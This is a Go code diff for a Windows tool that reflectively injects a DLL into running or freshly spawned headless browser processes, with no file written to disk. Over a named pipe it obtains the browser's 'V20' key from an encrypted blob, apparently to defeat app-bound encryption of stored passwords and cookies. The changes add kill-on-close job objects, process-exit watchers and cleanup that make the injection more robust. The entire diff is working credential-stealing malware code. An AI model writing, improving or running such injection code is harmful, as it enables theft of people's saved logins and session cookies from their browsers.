@@ -180,6 +180,22 @@ func writeReflectiveDLL(hProcess windows.Handle, dllBytes []byte) (loaderAddr ui
 	return remoteMem + uintptr(loaderOff), remoteMem, nil
 }
 
+func createKillOnCloseJob() (windows.Handle, error) {
+	job, err := windows.CreateJobObject(nil, nil)
+	if err != nil {
+		return 0, fmt.Errorf("CreateJobObject: %w", err)
+	}
+	var info windows.JOBOBJECT_EXTENDED_LIMIT_INFORMATION
+	info.BasicLimitInformation.LimitFlags |= windows.JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE
+	_, err = windows.SetInformationJobObject(job, windows.JobObjectExtendedLimitInformation,
+		uintptr(unsafe.Pointer(&info)), uint32(unsafe.Sizeof(info)))
+	if err != nil {
+		windows.CloseHandle(job)
+		return 0, fmt.Errorf("SetInformationJobObject: %w", err)
+	}
+	return job, nil
+}
+
 // InjectDLL reflectively injects the DLL into a running process via CreateRemoteThread.
 // The DLL bytes are written directly into the target process — no temp file on disk.
 func InjectDLL(dllBytes []byte, pipeName string, targetPID uint32) (*PipeSession, error) {
@@ -251,6 +267,7 @@ func CreatePipeSession(dllBytes []byte, browserName string) (*PipeSession, error
 				logf("inject PID %d failed: %v", pid, err)
 				continue
 			}
+			s.watchExit(fmt.Sprintf("existing %s", browserName), 5000)
 			if err := waitPipeConnect(hPipe, 5000); err != nil {
 				logf("pipe connect timeout for PID %d", pid)
 				s.Close()
@@ -277,6 +294,7 @@ func CreatePipeSession(dllBytes []byte, browserName string) (*PipeSession, error
 		windows.CloseHandle(hPipe)
 		return nil, fmt.Errorf("create and inject browser: %w", err)
 	}
+	s.watchExit(fmt.Sprintf("spawned %s", browserName), 15000)
 
 	if err := waitPipeConnect(hPipe, 15000); err != nil {
 		logf("pipe connect timeout for new process")
@@ -360,31 +378,54 @@ func CreateAndInjectBrowser(dllBytes []byte, pipeName string, browserName string
 	}
 	logf("created suspended %s process (PID: %d)", browserName, pi.ProcessId)
 
-	loaderAddr, _, err := writeReflectiveDLL(pi.Process, dllBytes)
-	if err != nil {
+	// Create a kill-on-close job and assign the suspended browser to it so the
+	// whole process tree is reaped when the session closes, even though the
+	// headless parent self-exits after serving one key.
+	job, jobErr := createKillOnCloseJob()
+	if jobErr != nil {
+		logf("job object unavailable, falling back to TerminateProcess: %v", jobErr)
+	} else if err := windows.AssignProcessToJobObject(job, pi.Process); err != nil {
+		logf("AssignProcessToJobObject failed, falling back to TerminateProcess: %v", err)
+		windows.CloseHandle(job)
+		job = 0
+	} else {
+		logf("spawned %s (PID %d) assigned to kill-on-close job", browserName, pi.ProcessId)
+	}
+
+	cleanup := func() {
+		if job != 0 {
+			windows.CloseHandle(job)
+		}
 		windows.TerminateProcess(pi.Process, 0)
 		windows.CloseHandle(pi.Process)
 		windows.CloseHandle(pi.Thread)
+	}
+
+	loaderAddr, _, err := writeReflectiveDLL(pi.Process, dllBytes)
+	if err != nil {
+		cleanup()
 		return nil, err
 	}
 
 	// Queue APC to the main thread — fires on its first alertable wait after resume.
 	ret, _, aerr := procQueueUserAPC.Call(loaderAddr, uintptr(pi.Thread), 0)
 	if ret == 0 {
-		windows.TerminateProcess(pi.Process, 0)
-		windows.CloseHandle(pi.Process)
-		windows.CloseHandle(pi.Thread)
+		cleanup()
 		return nil, fmt.Errorf("QueueUserAPC: %w", aerr)
 	}
 	logf("queued APC for reflective loader")
 
-	windows.ResumeThread(pi.Thread)
+	if _, err := windows.ResumeThread(pi.Thread); err != nil {
+		cleanup()
+		return nil, fmt.Errorf("ResumeThread: %w", err)
+	}
 	logf("resumed process main thread")
 
 	return &PipeSession{
 		pid:         pi.ProcessId,
 		hProcess:    pi.Process,
 		ownsProcess: true,
+		job:         job,
 	}, nil
 }
 
@@ -443,11 +484,12 @@ func TryV20KeyViaBrowserSession(processName, browserName string, encBlob []byte)
 		if i >= maxTries {
 			break
 		}
-		_, injErr := InjectDLL(dllBytes, pipeName, pid)
+		s, injErr := InjectDLL(dllBytes, pipeName, pid)
 		if injErr != nil {
 			logf("V20 inject %s PID %d: %v", browserName, pid, injErr)
 			continue
 		}
+		s.watchExit(fmt.Sprintf("V20 %s", browserName), 3000)
 		if connErr := waitPipeConnect(hPipe, 3000); connErr != nil {
 			logf("V20 pipe timeout for %s PID %d", browserName, pid)
 			procDisconnectNamedPipe.Call(uintptr(hPipe))
@@ -458,7 +500,7 @@ func TryV20KeyViaBrowserSession(processName, browserName string, encBlob []byte)
 			}
 			continue
 		}
-		s := &PipeSession{hPipe: hPipe}
+		s.hPipe = hPipe
 		encB64 := base64.StdEncoding.EncodeToString(encBlob)
 		key, keyErr := s.GetV20Key(browserName, encB64)
 		s.Close()
@@ -481,6 +523,7 @@ func TryV20KeyViaBrowserSession(processName, browserName string, encBlob []byte)
 		windows.CloseHandle(hPipe)
 		return nil, fmt.Errorf("create headless %s for V20: %w", browserName, err)
 	}
+	s.watchExit(fmt.Sprintf("V20 spawned %s", browserName), 15000)
 	if connErr := waitPipeConnect(hPipe, 15000); connErr != nil {
 		s.Close()
 		windows.CloseHandle(hPipe)
